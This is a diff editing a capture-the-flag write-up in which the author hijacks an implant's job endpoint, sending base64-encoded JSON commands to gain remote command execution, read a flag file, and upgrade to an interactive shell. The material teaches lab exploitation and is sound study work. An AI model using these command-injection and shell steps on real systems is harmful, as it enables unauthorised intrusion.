@@ -79,28 +79,31 @@ To begin interacting with the endponit, we'll host a file at `/get-job/ImxhdGVzd
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ echo 'ls' > get-job/ImxhdGVzdCI=
 ```
+After a brief wait we see the implant call our file, followed by a second call to a new endpoint `job-result`!
 
 ```bash
 10.10.115.84 - - [02/Aug/2023 17:31:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ==
 ```
 
-now we get `{"success": false, "result": "Encoding error"}`
+Decoding the base 64 we see `{"success": false, "result": "Encoding error"}`
 
-OK, so it wants b64
+OK, so it wants b64. On the next round we send
 
 `echo 'ls' | base64 > get-job/ImxhdGVzdCI=`
 
+And get back
+
 `{"success": false, "result": "JSON error"}`
 
-Let’s try the JSON format we received in the heartbeat message. Submitting
+Let’s try the JSON format we received in the heartbeat message. We submit:
 
 `echo '{"job_id": 0, "cmd": "ls"}' | base64 > get-job/ImxhdGVzdCI=`
 
-returns
+and get back
 
 `{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}`
 
-We've found the first flag already, let's grab it right now!
+We've achieved RCE and found the first flag already, let's grab it right now!
 
 `echo '{"job_id": 0, "cmd": "cat user.txt"}' | base64 > get-job/ImxhdGVzdCI=`
 
@@ -115,6 +118,8 @@ Some of the more popular shells don’t seem to work on this box but eventually 
 ```
 
 `python3 -c 'import pty;pty.spawn("/bin/bash");'`
+
+## Local Enumeration
 
 There is a Python script in our home directory. 
 
